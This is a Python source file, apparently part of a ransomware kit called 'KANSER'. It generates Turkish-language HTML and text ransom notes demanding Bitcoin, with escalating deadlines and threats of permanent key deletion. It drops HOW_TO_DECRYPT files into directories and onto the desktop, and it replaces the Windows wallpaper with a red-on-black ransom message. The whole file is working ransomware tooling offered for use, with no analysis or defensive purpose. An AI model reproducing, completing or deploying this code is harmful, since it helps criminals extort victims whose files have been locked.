#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSER RANSOMWARE — Ransom Note Generator
HTML + TXT + Duvar Kagidi degistirici
"""
import os

def generate_html(btc_address, amount_usd, contact_email):
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>DOSYALARINIZ SIFRELENDI</title>
<style>body{{background:#0a0000;color:#fff;font-family:Arial;text-align:center;padding:50px}}
h1{{color:#ff2a2a;font-size:48px;text-shadow:0 0 20px red}}.box{{background:#1a0000;border:2px solid #ff2a2a;border-radius:12px;padding:30px;max-width:600px;margin:30px auto}}
.btc{{background:#000;color:#ff2a2a;font-size:14px;padding:15px;border-radius:8px;word-break:break-all;font-family:monospace;border:1px solid #333}}
.timer{{color:#ff6600;font-size:24px;font-weight:bold}}.warn{{color:#ff2a2a;font-size:14px;margin-top:20px}}</style></head><body>
<h1>!! DOSYALARINIZ SIFRELENDI !!</h1>
<div class="box">
<h2>Ne Oldu?</h2><p>Tum belgeleriniz, fotograflariniz, veritabanlariniz ve diger onemli dosyalariniz <b>AES-256 + RSA-2048</b> ile sifrelendi.</p>
<p>Dosyalarinizi geri almanin tek yolu <b>OZEL SIFRE COZME ANAHTARINI</b> satin almaktir.</p>
</div>
<div class="box">
<h2>Nasil Geri Alirim?</h2><p>Asagidaki Bitcoin adresine <b>${amount_usd} USD</b> degerinde BTC gonderin:</p>
<div class="btc">{btc_address}</div><br>
<p>Odeme yaptiktan sonra <b>{contact_email}</b> adresine islem ID'nizi gonderin.</p>
<p class="timer">Fiyat 24 saat sonra 2 KATINA cikar!</p>
</div>
<div class="box">
<h2 class="warn">!! UYARILAR !!</h2><p>• Dosyalari manuel cozmeye CALISMAYIN — kalici veri kaybi olur.</p><p>• Antivirus programlari dosyalari KURTARAMAZ.</p><p>• 72 saat sonra OZEL ANAHTAR SUNUCUDAN SILINIR.</p>
</div></body></html>"""

def generate_txt(btc_address, amount_usd, contact_email, unique_id):
    return f"""========================================
  DOSYALARINIZ SIFRELENDI!
========================================

Tum dosyalariniz AES-256-CBC + RSA-2048
askeri seviye sifreleme ile kilitlendi.

Dosyalarinizi geri almak icin:
1. ${amount_usd} USD degerinde Bitcoin gonderin
2. Gonderim ID: {unique_id}

BITCOIN ADRESI:
{btc_address}

3. Odeme sonrasi iletisim: {contact_email}
   Konu: KANSER-RECOVER-{unique_id}

Fiyat 24 saat sonra 2 katina cikar.
72 saat sonra anahtar sunucudan SILINIR.

Dosyalari manuel cozmeye calismayin —
KALICI VERI KAYBI olur!

========================================"""

def deploy_notes(base_dirs, btc, amount, email, uid):
    """Tum not dosyalarini yerlestir"""
    results = []
    for d in base_dirs:
        try:
            html = generate_html(btc, amount, email)
            with open(os.path.join(d, "HOW_TO_DECRYPT.html"), "w", encoding="utf-8") as f: f.write(html)
            txt = generate_txt(btc, amount, email, uid)
            with open(os.path.join(d, "HOW_TO_DECRYPT.txt"), "w", encoding="utf-8") as f: f.write(txt)
            results.append(d)
        except: pass

    try:
        dp = os.path.join(os.environ.get("USERPROFILE", ""), "Desktop")
        with open(os.path.join(dp, "HOW_TO_DECRYPT.txt"), "w", encoding="utf-8") as f: f.write(txt)
    except: pass

    return results

def set_wallpaper(text):
    """Duvar kagidini degistir — siyah arkaplan + kirmizi yazi"""
    if os.name != "nt": return False
    try:
        import ctypes, struct
        from PIL import Image, ImageDraw, ImageFont

        w, h = 1920, 1080
        img = Image.new("RGB", (w, h), color=(5, 0, 0))
        draw = ImageDraw.Draw(img)
        try:
            font = ImageFont.truetype("arial.ttf", 48)
        except:
            font = ImageFont.load_default()
        lines = text.split("\n")
        y = h // 3
        for line in lines:
            bbox = draw.textbbox((0, 0), line, font=font)
            tw = bbox[2] - bbox[0]
            draw.text(((w - tw) // 2, y), line, fill=(255, 0, 0), font=font)
            y += 60
        wp_path = os.path.join(os.environ.get("TEMP", ""), "_wp.jpg")
        img.save(wp_path)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wp_path, 3)
        return True
    except: return False

if __name__ == "__main__":
    print("KANSER RANSOMWARE — Ransom Note Generator")
